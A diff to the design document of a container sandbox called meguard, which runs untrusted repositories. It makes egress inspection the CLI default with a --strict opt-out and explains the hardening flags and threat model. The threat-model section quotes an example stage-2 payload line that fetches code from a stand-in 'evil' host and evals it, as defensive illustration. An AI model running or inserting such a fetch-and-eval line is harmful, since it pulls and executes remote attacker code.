@@ -75,6 +75,14 @@ field, so:
 `Normalize` fills empty fields with conservative defaults (node:20-slim,
 `npm install`, 2g, 2 CPUs, 512 PIDs) and never removes a control.
 
+`InspectEgress` follows the same rule at the library level: its zero value is
+`false`, which yields `--network none` (the safest, no-stack mode), so a
+forgotten field still cannot open a hole. The `run` CLI, however, defaults
+`InspectEgress` to `true` (`--strict` sets it back to `false`) - a deliberate
+product choice to make egress visible by default. The distinction matters: the
+zero-value Profile is `--network none`; the CLI, not the library, is what opts
+into inspection.
+
 ### The lifecycle
 
 `Execute` (in `internal/sandbox/execute.go`) runs:
@@ -127,12 +135,14 @@ hostile code: a container escape then lands as an unprivileged user instead of
 host root. The pre-run notice prints the chosen runtime and labels it the trust
 boundary.
 
-### Egress inspection (`--inspect-egress`)
+### Egress inspection (default; `--strict` opts out)
 
-By default the sandbox gets `--network none`: there is no network stack at all,
-so a blocked connection attempt leaves no trace to report. `--inspect-egress`
-opts into a still-no-egress but OBSERVABLE posture, implemented as a monitor
-sidecar whose network namespace the sandbox joins:
+Egress is always denied. `--strict` gives `--network none`: no network stack at
+all, so a blocked connection attempt leaves no trace to report. The DEFAULT is
+the OBSERVABLE posture (still no egress): a monitor sidecar whose network
+namespace the sandbox joins. It is implemented as follows, and if the monitor
+cannot start the CLI falls back to `--network none` (see the fallback note at the
+end of this section):
 
 1. `StartMonitor` creates a hardened monitor container (`--cap-drop ALL` then
    only `--cap-add NET_ADMIN` `--cap-add NET_RAW`, `no-new-privileges`,
@@ -185,8 +195,17 @@ construction (OUTPUT DROP policy for v4+v6, verified before readiness, no
 `|| true` on any critical rule). The in-container netns/iptables/NFLOG behavior
 must still be verified once on a real Linux Docker host: NFLOG needs the
 `nfnetlink_log` kernel module, and `tcpdump` must support `-i nflog:<group>`.
-Until that pass lands, `--inspect-egress` is documented as experimental and the
-fully verified no-egress mode (`--network none`) remains the default.
+Until that pass lands, inspected mode is documented as experimental. It is the
+CLI default (for visibility), but the library zero-value Profile still selects
+`--network none`, and `--strict` selects the verified no-stack mode directly.
+
+Fallback: because inspected mode is experimental and needs a monitor image plus
+NFLOG, `Execute` wraps any monitor-start failure in `ErrMonitorUnavailable`. In
+the default (non-strict) mode the CLI catches that, prints a warning, and re-runs
+with `--network none`. This never weakens containment (no-stack is stronger than
+inspected) - it only loses the egress logs for that run, and the fallback is
+printed, never silent. `--strict` never inspects, so it has nothing to fall back
+from.
 
 ## Hardening flags and the door each closes
 
@@ -205,7 +224,7 @@ below:
 | `--pids-limit 512` | Cap fork bombs. |
 | `--memory 2g` | Cap memory (conservative; will be configurable). |
 | `--cpus 2` | Cap CPU (conservative; will be configurable). |
-| `--network none` | No egress at all; kills stage-2 payload fetches. This is the ONLY conditional flag: with `--inspect-egress` it becomes `--network container:<monitor>` (join the monitor's sealed, no-route netns), which is still no egress but observable. See "Egress inspection". |
+| `--network none` | No egress at all; kills stage-2 payload fetches. This is the ONLY conditional flag: it is used with `--strict`; the DEFAULT (inspected) mode instead uses `--network container:<monitor>` (join the monitor's sealed, no-route netns), which is still no egress but observable. See "Egress inspection". |
 | `-w /repo` | Work in the copied repo. |
 | `-e HOME=/home/sandbox` | HOME points at scratch tmpfs, not host home. |
 
@@ -223,12 +242,13 @@ What meguard denies:
 - Host filesystem access: no bind mounts of the repo or `$HOME`; the repo is
   copied into a container tmpfs. There are no host secrets in the container to
   read.
-- Egress: `--network none` means a stage-2 fetch (for example
-  `axios.get('https://evil/stage2').then(r => eval(r.data))`) cannot connect,
-  and any stolen data cannot be exfiltrated. With `--inspect-egress` the egress
-  is still fully denied, but each blocked attempt (including connections to
-  hardcoded IPs) is logged and reported, so you can SEE what the repo tried to
-  reach.
+- Egress: a stage-2 fetch (for example
+  `axios.get('https://evil/stage2').then(r => eval(r.data))`) cannot connect, and
+  any stolen data cannot be exfiltrated. In the DEFAULT inspected mode egress is
+  denied by a fail-closed OUTPUT DROP seal AND each blocked attempt (including
+  connections to hardcoded IPs) is logged and reported, so you can SEE what the
+  repo tried to reach. With `--strict` egress is denied by absence
+  (`--network none`, no stack) with no logs.
 - Persistence and escalation: read-only root, tmpfs-only writes, dropped caps,
   no-new-privileges, non-root user, and force-removal on exit leave nothing
   behind and nothing to escalate through.
